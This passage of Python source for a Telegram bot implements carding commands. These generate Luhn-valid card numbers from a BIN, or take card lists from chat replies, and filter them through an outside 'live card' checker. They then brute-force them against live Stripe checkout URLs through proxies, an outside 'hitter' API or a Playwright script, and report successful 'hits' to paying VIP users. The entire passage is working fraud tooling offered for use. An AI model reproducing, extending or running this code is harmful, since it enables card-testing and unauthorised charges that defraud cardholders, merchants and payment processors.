            "<code>/sco &lt;checkout_url&gt; 4111111111111111|12|26|123</code>\n\n"
            "📌 BIN bruteforce (10 cards auto-gen):\n"
            "<code>/sco &lt;checkout_url&gt; 411111</code>\n\n"
            "🔗 URL = checkout.stripe.com/c/pay/cs_live_...</b>"
        )

        # ── Parse args — support reply-to card list ────────────
        _sco_card_re = re.compile(r'\b(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})\b')

        def _extract_sco_cards(text):
            found = _sco_card_re.findall(text or "")
            return [f"{a}|{b}|{c}|{d}" for a, b, c, d in found]

        try:
            parts = message.text.split(None, 2)
            if len(parts) < 2:
                bot.reply_to(message, usage_msg, parse_mode="HTML")
                return
            checkout_url = parts[1].strip()
            arg2 = parts[2].strip() if len(parts) >= 3 else ""

            # If no arg2 → try to get cards from replied message
            if not arg2 and message.reply_to_message:
                _reply_text = message.reply_to_message.text or ""
                _reply_cards = _extract_sco_cards(_reply_text)
                if _reply_cards:
                    arg2 = "\n".join(_reply_cards)   # treat as multi-card input

            if not arg2:
                bot.reply_to(message, usage_msg, parse_mode="HTML")
                return
        except Exception:
            bot.reply_to(message, usage_msg, parse_mode="HTML")
            return

        # Multi-card mode: reply had full cards
        _reply_cards_list = _extract_sco_cards(arg2) if "\n" in arg2 or "|" in arg2 else []
        _is_bin = bool(re.match(r'^\d{6,8}$', arg2.strip())) and not _reply_cards_list
        _url_q  = requests.utils.quote(checkout_url, safe='')
        _url_short = _html.escape(checkout_url[:50])

        # ── Reply-Cards Mode: iterate live cards from chkm/gc output ────────
        if _reply_cards_list and not _is_bin:
            import html as _html
            total_rc   = len(_reply_cards_list)
            bin_rc     = _reply_cards_list[0].split("|")[0][:6]
            bin_info_r, bank_r, _, flag_r = get_bin_info(bin_rc)
            log_command(message, query_type="gateway", gateway="sco")
            proxy_dict_sco = get_proxy_dict(uid)

            stop_kb_sco = types.InlineKeyboardMarkup()
            stop_kb_sco.add(types.InlineKeyboardButton(text="🛑 Stop", callback_data='stop'))
            try:
                stopuser[f'{uid}']['status'] = 'start'
            except:
                stopuser[f'{uid}'] = {'status': 'start'}

            prog_rc = bot.reply_to(message,
                f"<b>╔══════════════════════════╗\n"
                f"║  🔗  S C O  H I T T E R  ║\n"
                f"╚══════════════════════════╝\n"
                f"│\n"
                f"│  🃏 Cards from reply: <b>{total_rc}</b>\n"
                f"│  💳 BIN: <code>{bin_rc}</code> {_html.escape(flag_r)}\n"
                f"│  🏦 Bank: {_html.escape(bank_r)}\n"
                f"│\n"
                f"│  [░░░░░░░░░░░░] 0%  0/{total_rc}\n"
                f"│  ⏳ Starting...\n"
                f"└────────────────────────────</b>", parse_mode="HTML",
                reply_markup=stop_kb_sco)

            t0_rc   = time.time()
            hit_rc  = None; hit_msg_rc = None; hit_icon_rc = None; hit_word_rc = None
            tried_rc = 0

            def _rc_bar(done, total, w=12):
                f = int(w * done / total) if total else 0
                return "█" * f + "░" * (w - f)

            for rc_card in _reply_cards_list:
                if stopuser.get(f'{uid}', {}).get('status') == 'stop':
                    try:
                        bot.edit_message_text(
                            f"<b>🛑 STOPPED — {tried_rc}/{total_rc} checked\n"
                            f"⏱ Time: {round(time.time()-t0_rc,1)}s</b>",
                            chat_id=prog_rc.chat.id, message_id=prog_rc.message_id, parse_mode="HTML")
                    except: pass
                    return

                tried_rc += 1
                pct_rc  = int(tried_rc / total_rc * 100)
                bar_rc  = _rc_bar(tried_rc, total_rc)
                try:
                    bot.edit_message_text(
                        f"<b>╔══════════════════════════╗\n"
                        f"║  🔗  S C O  H I T T E R  ║\n"
                        f"╚══════════════════════════╝\n"
                        f"│\n"
                        f"│  🃏 Cards: {total_rc}  ·  💳 BIN: <code>{bin_rc}</code>\n"
                        f"│\n"
                        f"│  [{bar_rc}] {pct_rc}%  {tried_rc}/{total_rc}\n"
                        f"│  🔄 » <code>{_html.escape(rc_card)}</code>\n"
                        f"└────────────────────────────</b>",
                        chat_id=prog_rc.chat.id, message_id=prog_rc.message_id, parse_mode="HTML",
                        reply_markup=stop_kb_sco)
                except Exception:
                    pass

                cc_enc_rc = rc_card.replace("|", "%7C")
                ep_rc = f"{_SCO_API}/stripe/checkout-based/url/{_url_q}/pay/cc/{cc_enc_rc}"
                rj_rc = _sco_hit_api(ep_rc, proxy_dict_sco, timeout=55)

                raw_rc_plain = str(rj_rc.get("message") or rj_rc.get("error") or "")[:65]
                raw_rc = _html.escape(raw_rc_plain)

                if any(x in raw_rc_plain.lower() for x in (
                    "unable to extract", "no public key", "invalid checkout", "checkout session expired"
                )):
                    bot.edit_message_text(
                        f"<b>╔══════════════════════════╗\n"
                        f"║  🔗  S C O  H I T T E R  ║\n"
                        f"╚══════════════════════════╝\n"
                        f"│  🚫 STOPPED — URL expired / invalid\n"
                        f"│  ⏱ Time: {round(time.time()-t0_rc,1)}s\n"
                        f"└────────────────────────────</b>",
                        chat_id=prog_rc.chat.id, message_id=prog_rc.message_id, parse_mode="HTML")
                    return

                icon_rc, word_rc, is_hit_rc = _sco_classify(rj_rc)
                if is_hit_rc:
                    hit_rc = rc_card; hit_msg_rc = raw_rc; hit_icon_rc = icon_rc; hit_word_rc = word_rc
                    break

            total_time_rc = round(time.time() - t0_rc, 1)
            uname_rc = message.from_user.username or str(message.from_user.id)
            if hit_rc:
                bot.edit_message_text(
                    f"<b>╔══════════════════════════╗\n"
                    f"║  🔗  S C O  H I T !  ║\n"
                    f"╚══════════════════════════╝\n"
                    f"│\n"
                    f"│  {hit_icon_rc}  <b>{hit_word_rc}</b>\n"
                    f"│\n"
                    f"│  💳 Card  » <code>{_html.escape(hit_rc)}</code>\n"
                    f"│  💬 Msg   » {hit_msg_rc}\n"
                    f"│\n"
                    f"│  📊 {tried_rc}/{total_rc} tried  ·  ⏱ {total_time_rc}s\n"
                    f"│  👤 By » @{_html.escape(uname_rc)}\n"
                    f"└────────────────────────────</b>",
                    chat_id=prog_rc.chat.id, message_id=prog_rc.message_id, parse_mode="HTML")
            else:
                bot.edit_message_text(
                    f"<b>╔══════════════════════════╗\n"
                    f"║  🔗  S C O  H I T T E R  ║\n"
                    f"╚══════════════════════════╝\n"
                    f"│\n"
                    f"│  ❌  NO HIT\n"
                    f"│\n"
                    f"│  📊 {tried_rc}/{total_rc} cards tried\n"
                    f"│  ⏱ Time: {total_time_rc}s\n"
                    f"│  👤 By » @{_html.escape(uname_rc)}\n"
                    f"└────────────────────────────</b>",
                    chat_id=prog_rc.chat.id, message_id=prog_rc.message_id, parse_mode="HTML")
            return

        # ── BIN Mode: generate 10 cards locally, try one by one ──────────────
        if _is_bin:
            bin_6 = arg2[:6]
            bin_info, bank, country, country_flag = get_bin_info(bin_6)
            log_command(message, query_type="gateway", gateway="sco")
            total = 10
            progress = bot.reply_to(message,
                f"<b>🔗 SCO BIN BRUTEFORCE\n"
                f"━━━━━━━━━━━━━━━━━━━━━\n"
                f"💳 BIN   » <code>{bin_6}</code>\n"
                f"🏦 Bank  » {_html.escape(bank)}\n"
                f"🌍 Info  » {_html.escape(bin_info)}\n"
                f"📊 Progress » 0/{total}\n"
                f"━━━━━━━━━━━━━━━━━━━━━\n"
                f"⏳ Generating &amp; checking cards...</b>", parse_mode="HTML")

            t0_all = time.time()
            hit_card   = None
            hit_msg    = None
            hit_icon   = None
            hit_word   = None
            dead_count = 0
            last_card  = None
            _same_err_streak = 0
            _last_raw_msg    = None
            early_stop_reason = None

            proxy_dict_sco = get_proxy_dict(uid)
            for idx in range(1, total + 1):
                cc_gen = _sco_gen_card(bin_6)
                last_card = cc_gen
                cc_enc = cc_gen.replace("|", "%7C")
                ep = f"{_SCO_API}/stripe/checkout-based/url/{_url_q}/pay/cc/{cc_enc}"
                rj = _sco_hit_api(ep, proxy_dict_sco, timeout=55)

                icon, word, is_hit = _sco_classify(rj)
                raw_plain = str(rj.get("message") or rj.get("error") or "")[:70]
                raw = _html.escape(raw_plain)

                # Detect repeated same error (checkout URL dead/expired)
                _raw_lo = raw_plain.lower()
                _url_dead = any(x in _raw_lo for x in (
                    "payment failed after retries", "unable to extract", "session", "expired",
                    "invalid checkout", "no public key", "public key from checkout"
                ))
                if _url_dead:
                    early_stop_reason = (
                        "⚠️ Checkout URL seems expired or 3DS-locked.\n"
                        "   Try a fresh checkout.stripe.com link."
                    )
                    dead_count += 1
                    break

                if raw_plain == _last_raw_msg:
                    _same_err_streak += 1
                else:
                    _same_err_streak = 0
                _last_raw_msg = raw_plain

                # Update progress every card
                try:
                    bar = "🟩" * idx + "⬜" * (total - idx)
                    bot.edit_message_text(
                        f"<b>🔗 SCO BIN BRUTEFORCE\n"
                        f"━━━━━━━━━━━━━━━━━━━━━\n"
                        f"💳 BIN   » <code>{bin_6}</code>\n"
                        f"🏦 Bank  » {_html.escape(bank)}\n"
                        f"🌍 Info  » {_html.escape(bin_info)}\n"
                        f"━━━━━━━━━━━━━━━━━━━━━\n"
                        f"📊 Progress  » {idx}/{total}\n"
                        f"{bar}\n"
                        f"━━━━━━━━━━━━━━━━━━━━━\n"
                        f"🔄 Last » <code>{cc_gen}</code>\n"
                        f"   {icon} {word} — {raw}</b>",
                        chat_id=progress.chat.id, message_id=progress.message_id, parse_mode="HTML")
                except Exception:
                    pass

                if is_hit:
                    hit_card = cc_gen
                    hit_msg  = raw
                    hit_icon = icon
                    hit_word = word
                    break
                else:
                    dead_count += 1

                # Early stop: 3 consecutive identical errors = URL issue
                if _same_err_streak >= 2:
                    early_stop_reason = (
                        f"⚠️ Same error 3x in a row: <i>{raw}</i>\n"
                        "   URL may be expired or 3DS-required."
                    )
                    break

            elapsed = round(time.time() - t0_all, 2)

            _uname = _html.escape(str(message.from_user.username or uid))
            if hit_card:
                final = (
                    f"<b>╔══════════════════════╗\n"
                    f"║  🔗  STRIPE CHECKOUT  ║\n"
                    f"╚══════════════════════╝\n"
                    f"\n"
                    f"  {hit_icon}  {hit_word}\n"
                    f"\n"
                    f"  💳 Card   » <code>{hit_card}</code>\n"
                    f"  🏦 Bank   » {_html.escape(bank)}\n"
                    f"  🌍 Info   » {_html.escape(bin_info)}\n"
                    f"  💬 Msg    » {hit_msg}\n"
                    f"  📊 Tried  » {dead_count+1}/{total} cards\n"
                    f"  ⏱ Time   » {elapsed}s\n"
                    f"\n"
                    f"  🔗 Gate  » Stripe Checkout\n"
                    f"  👤 By    » @{_uname}</b>"
                )
            elif early_stop_reason:
                final = (
                    f"<b>╔══════════════════════╗\n"
                    f"║  🔗  STRIPE CHECKOUT  ║\n"
                    f"╚══════════════════════╝\n"
                    f"\n"
                    f"  🚫  STOPPED EARLY\n"
                    f"\n"
                    f"  💳 BIN    » <code>{bin_6}</code>\n"
                    f"  🏦 Bank   » {_html.escape(bank)}\n"
                    f"  🌍 Info   » {_html.escape(bin_info)}\n"
                    f"  📊 Tried  » {dead_count}/{total} cards\n"
                    f"  ⏱ Time   » {elapsed}s\n"
                    f"\n"
                    f"  ⚠️ Reason » {early_stop_reason}\n"
                    f"\n"
                    f"  👤 By    » @{_uname}</b>"
                )
            else:
                final = (
                    f"<b>╔══════════════════════╗\n"
                    f"║  🔗  STRIPE CHECKOUT  ║\n"
                    f"╚══════════════════════╝\n"
                    f"\n"
                    f"  ❌  ALL {total} CARDS DECLINED\n"
                    f"\n"
                    f"  💳 BIN    » <code>{bin_6}</code>\n"
                    f"  🏦 Bank   » {_html.escape(bank)}\n"
                    f"  🌍 Info   » {_html.escape(bin_info)}\n"
                    f"  📊 Tried  » {dead_count}/{total} cards\n"
                    f"  ⏱ Time   » {elapsed}s\n"
                    f"\n"
                    f"  🔗 Gate  » Stripe Checkout\n"
                    f"  👤 By    » @{_uname}</b>"
                )
            bot.edit_message_text(final, chat_id=progress.chat.id,
                                  message_id=progress.message_id, parse_mode="HTML")
            return

        # ── Single Card Mode ──────────────────────────────────────────────────
        cc = _extract_cc(arg2)
        if not cc:
            bot.reply_to(message, "<b>❌ Invalid card format.\nCorrect: <code>4111111111111111|12|26|123</code></b>", parse_mode="HTML")
            return

        bin_num = cc.replace("|", "")[:6]
        bin_info, bank, country, country_flag = get_bin_info(bin_num)
        log_command(message, query_type="gateway", gateway="sco")
        wait_msg = bot.reply_to(message,
            f"<b>⏳ Checking [Stripe Checkout]...\n"
            f"🔗 URL  » <code>{_url_short}...</code>\n"
            f"💳 Card » <code>{cc}</code></b>", parse_mode="HTML")

        proxy_dict_sco = get_proxy_dict(uid)
        t0 = time.time()
        cc_enc = cc.replace("|", "%7C")
        ep = f"{_SCO_API}/stripe/checkout-based/url/{_url_q}/pay/cc/{cc_enc}"
        rj = _sco_hit_api(ep, proxy_dict_sco, timeout=60)
        elapsed = round(time.time() - t0, 2)
        if "error" in rj and not rj.get("message"):
            bot.edit_message_text(f"<b>❌ API Error: {_html.escape(str(rj['error'])[:80])}</b>",
                chat_id=wait_msg.chat.id, message_id=wait_msg.message_id, parse_mode="HTML")
            return

        icon, word, _ = _sco_classify(rj)
        raw_msg = _html.escape(str(rj.get("message") or rj.get("error") or rj.get("result") or "")[:70])

        result_text = (
            f"<b>╔══════════════════════╗\n"
            f"║  🔗  STRIPE CHECKOUT  ║\n"
            f"╚══════════════════════╝\n"
            f"\n"
            f"  {icon}  <b>{word}</b>\n"
            f"\n"
            f"  💳 Card   » <code>{cc}</code>\n"
            f"  🏦 Bank   » {_html.escape(bank)}\n"
            f"  🌍 Info   » {_html.escape(bin_info)}\n"
            f"  💬 Msg    » {raw_msg}\n"
            f"  ⏱ Time   » {elapsed}s\n"
            f"\n"
            f"  🔗 Gate  » Stripe Checkout\n"
            f"  👤 By    » @{message.from_user.username or uid}</b>"
        )
        bot.edit_message_text(result_text, chat_id=wait_msg.chat.id,
                              message_id=wait_msg.message_id, parse_mode="HTML")

    threading.Thread(target=my_function).start()

# ================== /gsco — Gen → Live Filter → SCO Hit ==================
@bot.message_handler(commands=["gco"])
def gco_command(message):
    """Pipeline: BIN → generate cards → chkr.cc live filter → /sco checkout hit"""
    def my_function():
        import html as _html
        uid = message.from_user.id
        try:
            with open("data.json", "r", encoding="utf-8") as _f:
                _jd = json.load(_f)
            BL = _jd.get(str(uid), {}).get("plan", "𝗙𝗥𝗘𝗘")
        except Exception:
            BL = "𝗙𝗥𝗘𝗘"
        if BL == "𝗙𝗥𝗘𝗘" and uid != admin:
            bot.reply_to(message, "<b>❌ VIP only command.</b>", parse_mode="HTML")
            return

        usage_msg = (
            "<b>╔══ ⚡ GEN → LIVE → SCO PIPELINE ══╗\n\n"
            "📌 Usage:\n"
            "<code>/gco &lt;checkout_url&gt; &lt;BIN&gt; [count]</code>\n\n"
            "📌 Example:\n"
            "<code>/gco https://checkout.stripe.com/c/pay/cs_live_xxx 411111 20</code>\n\n"
            "🔄 Pipeline:\n"
            "  1️⃣ Generate N cards from BIN\n"
            "  2️⃣ chkr.cc → filter live/OTP cards\n"
            "  3️⃣ /sco → checkout hit on live cards\n\n"
            "💡 count = how many to gen (default 10, max 50)</b>"
        )

        try:
            parts = message.text.split(None, 3)
            if len(parts) < 3:
                bot.reply_to(message, usage_msg, parse_mode="HTML")
                return
            checkout_url = parts[1].strip()
            bin_arg      = parts[2].strip()
            gen_count    = int(parts[3].strip()) if len(parts) == 4 else 10
            gen_count    = min(max(gen_count, 5), 50)
        except Exception:
            bot.reply_to(message, usage_msg, parse_mode="HTML")
            return

        if not re.match(r'^\d{6,8}', bin_arg):
            bot.reply_to(message, "<b>❌ Invalid BIN. Must be 6-8 digits.</b>", parse_mode="HTML")
            return

        bin_6 = bin_arg[:6]
        bin_info, bank, country, cc_flag = get_bin_info(bin_6)
        _url_q     = requests.utils.quote(checkout_url, safe='')
        _url_short = _html.escape(checkout_url[:45])
        _uname     = _html.escape(str(message.from_user.username or uid))

        log_command(message, query_type="gateway", gateway="gco")

        # ── Stage 1: Generate cards ────────────────────────────────────
        is_amex = bin_6[0] == '3'
        clen    = 15 if is_amex else 16

        def _luhn_ok(n):
            d = [int(x) for x in n]
            odd = d[-1::-2]; even = d[-2::-2]
            return (sum(odd) + sum(sum(divmod(x*2,10)) for x in even)) % 10 == 0

        def _gen_one():
            cc_n = bin_6
            while len(cc_n) < clen - 1:
                cc_n += str(random.randint(0, 9))
            for ck in range(10):
                if _luhn_ok(cc_n + str(ck)):
                    cc_n += str(ck); break
            mm  = str(random.randint(1, 12)).zfill(2)
            cur = datetime.now().year % 100
            yy  = str(random.randint(cur + 1, cur + 5)).zfill(2)
            cvv = str(random.randint(1000,9999)) if is_amex else str(random.randint(100,999)).zfill(3)
            return f"{cc_n}|{mm}|{yy}|{cvv}"

        cards_to_check = []
        seen = set()
        for _ in range(gen_count * 10):
            if len(cards_to_check) >= gen_count:
                break
            c = _gen_one()
            if c not in seen:
                seen.add(c); cards_to_check.append(c)

        stop_kb_gco = types.InlineKeyboardMarkup()
        stop_kb_gco.add(types.InlineKeyboardButton(text="🛑 Stop", callback_data='stop'))

        prog = bot.reply_to(message,
            f"<b>╔══════════════════════════╗\n"
            f"║  ⚡  G E N → S C O  P I P E  ║\n"
            f"╚══════════════════════════╝\n"
            f"│\n"
            f"│  💳 BIN   » <code>{bin_6}</code> {cc_flag}\n"
            f"│  🏦 Bank  » {_html.escape(bank)}\n"
            f"│  🌍 Info  » {_html.escape(bin_info)}\n"
            f"│\n"
            f"│  ✅ Stage 1  {len(cards_to_check)} cards generated\n"
            f"│  🔄 Stage 2  chkr.cc live filter → starting...\n"
            f"│  [░░░░░░░░░░░░] 0%\n"
            f"│\n"
            f"│  ⏳ Stage 3  SCO hit → pending\n"
            f"└────────────────────────────</b>", parse_mode="HTML",
            reply_markup=stop_kb_gco)

        # ── Stage 2: chkr.cc live filter ──────────────────────────────
        proxy_dict_gco = get_proxy_dict(uid)

        def _chkrcc(card):
            try:
                r = requests.post("https://api.chkr.cc/",
                    json={"data": card},
                    headers={"Content-Type": "application/json"},
                    proxies=proxy_dict_gco or {}, timeout=10)
                if r.status_code == 200:
                    data = r.json()
                    if not ("error" in data and
                            ("quota" in str(data.get("message","")).lower() or
                             "rate" in str(data.get("message","")).lower())):
                        return data
            except Exception:
                pass
            try:
                res, _lbl = stripe_auth_ex(card, proxy_dict_gco or None)
                res_l = res.lower()
                if "approved" in res_l and "otp" not in res_l and "insufficient" not in res_l:
                    return {"code": 1, "message": res, "card": {}}
                if "otp" in res_l or "requires_action" in res_l or "3ds" in res_l:
                    return {"code": 2, "message": res, "card": {}}
                if "declined" in res_l or "insufficient" in res_l:
                    return {"code": 3, "message": res, "card": {}}
            except Exception:
                pass
            return {"code": -1, "status": "Error", "message": "", "card": {}}

        try:
            stopuser[f'{uid}']['status'] = 'start'
        except:
            stopuser[f'{uid}'] = {'status': 'start'}

        live_count    = 0
        otp_count_gc  = 0
        dead_count_gc = 0
        sco_tried     = 0
        t0_gc         = time.time()
        _BAR_W        = 12

        def _prog_bar(done, total, width=_BAR_W):
            filled = int(width * done / total) if total else 0
            return "█" * filled + "░" * (width - filled)

        def _pipe_msg(checked, cur_card="", stage="chkr", sco_icon="", sco_word="", sco_raw=""):
            pct  = int(checked / len(cards_to_check) * 100) if cards_to_check else 0
            bar  = _prog_bar(checked, len(cards_to_check))
            stg2 = "🔄 chkr.cc" if stage == "chkr" else "✅ chkr.cc"
            stg3 = "🔥 SCO hit → in progress" if stage == "sco" else "⏳ SCO hit → fires on next live"
            lines = (
                f"<b>╔══════════════════════════╗\n"
                f"║  ⚡  G E N → S C O  P I P E  ║\n"
                f"╚══════════════════════════╝\n"
                f"│\n"
                f"│  💳 BIN   » <code>{bin_6}</code> {cc_flag}\n"
                f"│  🏦 Bank  » {_html.escape(bank)}\n"
                f"│  🌍 Info  » {_html.escape(bin_info)}\n"
                f"│\n"
                f"│  ✅ Gen    {len(cards_to_check)} cards\n"
                f"│  {stg2}  [{bar}] {pct}%  {checked}/{len(cards_to_check)}\n"
                f"│  ✅ Live: <b>{live_count}</b>  ⚠️ OTP: <b>{otp_count_gc}</b>  ❌ Dead: <b>{dead_count_gc}</b>\n"
                f"│  🔫 SCO tried: <b>{sco_tried}</b>\n"
            )
            if cur_card:
                lines += f"│  🔍 » <code>{cur_card}</code>\n"
            if stage == "sco" and sco_word:
                lines += f"│  {sco_icon} {sco_word}"
                if sco_raw:
                    lines += f" — {sco_raw}"
                lines += "\n"
            lines += f"│\n│  {stg3}\n└────────────────────────────</b>"
            return lines

        sco_hit  = None
        sco_msg  = None
        sco_icon = None
        sco_word = None

        for i, card in enumerate(cards_to_check, 1):
            if stopuser.get(f'{uid}', {}).get('status') == 'stop':
                try:
                    bot.edit_message_text(_pipe_msg(i-1, "", "chkr", "", "🛑 STOPPED"),
                        chat_id=prog.chat.id, message_id=prog.message_id, parse_mode="HTML")
                except: pass
                return

            resp = _chkrcc(card)
            code = resp.get("code", -1)

            if code == 1:
                live_count += 1
            elif code == 2:
                otp_count_gc += 1
            else:
                dead_count_gc += 1

            if i % 2 == 0 or i == len(cards_to_check):
                try:
                    bot.edit_message_text(_pipe_msg(i, card, "chkr"),
                        chat_id=prog.chat.id, message_id=prog.message_id, parse_mode="HTML",
                        reply_markup=stop_kb_gco)
                except Exception:
                    pass

            if code != 1:
                time.sleep(0.3)
                continue

            sco_tried += 1
            try:
                bot.edit_message_text(_pipe_msg(i, card, "sco", "⏳", "Hitting SCO..."),
                    chat_id=prog.chat.id, message_id=prog.message_id, parse_mode="HTML",
                    reply_markup=stop_kb_gco)
            except Exception:
                pass

            cc_enc = card.replace("|", "%7C")
            ep = f"{_SCO_API}/stripe/checkout-based/url/{_url_q}/pay/cc/{cc_enc}"
            rj = _sco_hit_api(ep, proxy_dict_gco, timeout=55)

            raw_plain = str(rj.get("message") or rj.get("error") or "")[:65]
            raw       = _html.escape(raw_plain)

            if any(x in raw_plain.lower() for x in (
                "unable to extract", "no public key", "invalid checkout", "checkout session expired"
            )):
                bot.edit_message_text(
                    f"<b>╔══════════════════════════╗\n"
                    f"║  ⚡  G E N → S C O  P I P E  ║\n"
                    f"╚══════════════════════════╝\n"
                    f"│\n"
                    f"│  🚫  STOPPED — URL ISSUE\n"
                    f"│\n"
                    f"│  💳 BIN    » <code>{bin_6}</code>\n"
                    f"│  🏦 Bank   » {_html.escape(bank)}\n"
                    f"│  📊 Live   » {live_count} found, {sco_tried} SCO tried\n"
                    f"│  ⚠️ Reason » URL expired / invalid\n"
                    f"│  ⏱ Time   » {round(time.time()-t0_gc,1)}s\n"
                    f"│\n"
                    f"│  👤 By » @{_uname}\n"
                    f"└────────────────────────────</b>",
                    chat_id=prog.chat.id, message_id=prog.message_id, parse_mode="HTML")
                return

            icon, word, is_hit = _sco_classify(rj)

            try:
                bot.edit_message_text(_pipe_msg(i, card, "sco", icon, word, raw),
                    chat_id=prog.chat.id, message_id=prog.message_id, parse_mode="HTML")
            except Exception:
                pass

            if is_hit:
                sco_hit  = card
                sco_msg  = raw
                sco_icon = icon
                sco_word = word
                break

        total_time = round(time.time() - t0_gc, 1)

        if sco_hit:
            bot.edit_message_text(
                f"<b>╔══════════════════════════╗\n"
                f"║  ⚡  G E N → S C O  H I T !  ║\n"
                f"╚══════════════════════════╝\n"
                f"│\n"
                f"│  {sco_icon}  <b>{sco_word}</b>\n"
                f"│\n"
                f"│  💳 Card   » <code>{sco_hit}</code>\n"
                f"│  🏦 Bank   » {_html.escape(bank)}\n"
                f"│  🌍 Info   » {_html.escape(bin_info)}\n"
                f"│  💬 Msg    » {sco_msg}\n"
                f"│\n"
                f"│  📊 Stats\n"
                f"│  ├ Gen     » {len(cards_to_check)} cards\n"
                f"│  ├ Live    » {live_count} ({otp_count_gc} OTP)\n"
                f"│  ├ SCO     » {sco_tried} tried\n"
                f"│  └ Time    » {total_time}s\n"
                f"│\n"
                f"│  🔗 Gate  » Stripe Checkout\n"
                f"│  👤 By    » @{_uname}\n"
                f"└────────────────────────────</b>",
                chat_id=prog.chat.id, message_id=prog.message_id, parse_mode="HTML")
        else:
            _otp_note = f"│  ⚠️ OTP found: {otp_count_gc} (skipped)\n" if otp_count_gc else ""
            bot.edit_message_text(
                f"<b>╔══════════════════════════╗\n"
                f"║  ⚡  G E N → S C O  P I P E  ║\n"
                f"╚══════════════════════════╝\n"
                f"│\n"
                f"│  ❌  NO HIT\n"
                f"│\n"
                f"│  💳 BIN   » <code>{bin_6}</code> {cc_flag}\n"
                f"│  🏦 Bank  » {_html.escape(bank)}\n"
                f"│  🌍 Info  » {_html.escape(bin_info)}\n"
                f"│\n"
                f"│  📊 Stats\n"
                f"│  ├ Gen    » {len(cards_to_check)} cards\n"
                f"│  ├ Live   » {live_count} ({otp_count_gc} OTP)\n"
                f"│  ├ SCO    » {sco_tried} tried\n"
                f"│  └ Time   » {total_time}s\n"
                f"{_otp_note}"
                f"│\n"
                f"│  👤 By  » @{_uname}\n"
                f"└────────────────────────────</b>",
                chat_id=prog.chat.id, message_id=prog.message_id, parse_mode="HTML")

    threading.Thread(target=my_function).start()

# ================== /gh — GEN → chkr.cc → Playwright Hitter Pipeline ==================
@bot.message_handler(commands=["gh"])
def gh_command(message):
    """Pipeline: BIN → generate cards → chkr.cc live filter → Playwright (.h) checkout hit"""
    def my_function():
        import html as _html
        uid = message.from_user.id
        try:
            with open("data.json", "r", encoding="utf-8") as _f:
                _jd = json.load(_f)
            BL = _jd.get(str(uid), {}).get("plan", "𝗙𝗥𝗘𝗘")
        except Exception:
            BL = "𝗙𝗥𝗘𝗘"
        if BL == "𝗙𝗥𝗘𝗘" and uid != admin:
            bot.reply_to(message, "<b>❌ VIP only command.</b>", parse_mode="HTML")
            return

        usage_msg = (
            "<b>╔══ 🎯 GEN → LIVE → HITTER PIPELINE ══╗\n\n"
            "📌 Usage:\n"
            "<code>/gh &lt;checkout_url&gt; &lt;BIN&gt; [count]</code>\n\n"
            "📌 Example:\n"
            "<code>/gh https://checkout.stripe.com/c/pay/cs_live_xxx 411111 10</code>\n\n"
            "🔄 Pipeline:\n"
            "  1️⃣ Generate N cards from BIN\n"
            "  2️⃣ chkr.cc → filter live cards only\n"
            "  3️⃣ Playwright hitter → checkout hit on each live card\n\n"
            "💡 count = how many to gen (default 10, max 30)\n"
            "⚠️ Playwright is slow (~30-90s/card) — keep count low</b>"
        )

        try:
            parts = message.text.split(None, 3)
            if len(parts) < 3:
                bot.reply_to(message, usage_msg, parse_mode="HTML")
                return
            checkout_url = parts[1].strip()
            bin_arg      = parts[2].strip()
            gen_count    = int(parts[3].strip()) if len(parts) == 4 else 10
            gen_count    = min(max(gen_count, 3), 30)
        except Exception:
            bot.reply_to(message, usage_msg, parse_mode="HTML")
            return

        if not re.match(r'^\d{6,8}', bin_arg):
            bot.reply_to(message, "<b>❌ Invalid BIN. Must be 6-8 digits.</b>", parse_mode="HTML")
            return

        bin_6 = bin_arg[:6]
        bin_info, bank, country, cc_flag = get_bin_info(bin_6)
        _uname = _html.escape(str(message.from_user.username or uid))

        log_command(message, query_type="gateway", gateway="gh")

        # ── Stage 1: Generate cards ────────────────────────────────────
        is_amex = bin_6[0] == '3'
        clen    = 15 if is_amex else 16

        def _luhn_ok(n):
            d = [int(x) for x in n]
            odd = d[-1::-2]; even = d[-2::-2]
            return (sum(odd) + sum(sum(divmod(x*2,10)) for x in even)) % 10 == 0

        def _gen_one():
            cc_n = bin_6
            while len(cc_n) < clen - 1:
                cc_n += str(random.randint(0, 9))
            for ck in range(10):
                if _luhn_ok(cc_n + str(ck)):
                    cc_n += str(ck); break
            mm  = str(random.randint(1, 12)).zfill(2)
            cur = datetime.now().year % 100
            yy  = str(random.randint(cur + 1, cur + 5)).zfill(2)
            cvv = str(random.randint(1000,9999)) if is_amex else str(random.randint(100,999)).zfill(3)
            return f"{cc_n}|{mm}|{yy}|{cvv}"

        cards_to_check = []
        seen = set()
        for _ in range(gen_count * 10):
            if len(cards_to_check) >= gen_count:
                break
            c = _gen_one()
            if c not in seen:
                seen.add(c); cards_to_check.append(c)

        prog = bot.reply_to(message,
            f"<b>╔══════════════════════════╗\n"
            f"║  🎯  G E N → H I T  P I P E  ║\n"
            f"╚══════════════════════════╝\n"
            f"│\n"
            f"│  💳 BIN   » <code>{bin_6}</code> {cc_flag}\n"
            f"│  🏦 Bank  » {_html.escape(bank)}\n"
            f"│  🌍 Info  » {_html.escape(bin_info)}\n"
            f"│\n"
            f"│  ✅ Stage 1  {len(cards_to_check)} cards generated\n"
            f"│  🔄 Stage 2  chkr.cc live filter → starting...\n"
            f"│  [░░░░░░░░░░░░] 0%\n"
            f"│\n"
            f"│  ⏳ Stage 3  Playwright hitter → pending\n"
            f"└────────────────────────────</b>", parse_mode="HTML")

        # ── Stage 2: chkr.cc ──────────────────────────────────────────
        def _chkrcc(card):
            try:
                r = requests.post("https://api.chkr.cc/",
                    json={"data": card},
                    headers={"Content-Type": "application/json"}, timeout=10)
                if r.status_code == 200:
                    data = r.json()
                    if not ("error" in data and
                            ("quota" in str(data.get("message","")).lower() or
                             "rate" in str(data.get("message","")).lower())):
                        return data
            except Exception:
                pass
            try:
                res, _lbl = stripe_auth_ex(card, None)
                res_l = res.lower()
                if "approved" in res_l and "otp" not in res_l and "insufficient" not in res_l:
                    return {"code": 1, "message": res, "card": {}}
                if "otp" in res_l or "requires_action" in res_l or "3ds" in res_l:
                    return {"code": 2, "message": res, "card": {}}
                if "declined" in res_l or "insufficient" in res_l:
                    return {"code": 3, "message": res, "card": {}}
            except Exception:
                pass
            return {"code": -1, "status": "Error", "message": "", "card": {}}

        _BAR_W = 12

        def _prog_bar(done, total, width=_BAR_W):
            filled = int(width * done / total) if total else 0
            return "█" * filled + "░" * (width - filled)

        def _pipe_msg(checked, cur_card="", stage="chkr", h_icon="", h_word="", h_raw=""):
            pct  = int(checked / len(cards_to_check) * 100) if cards_to_check else 0
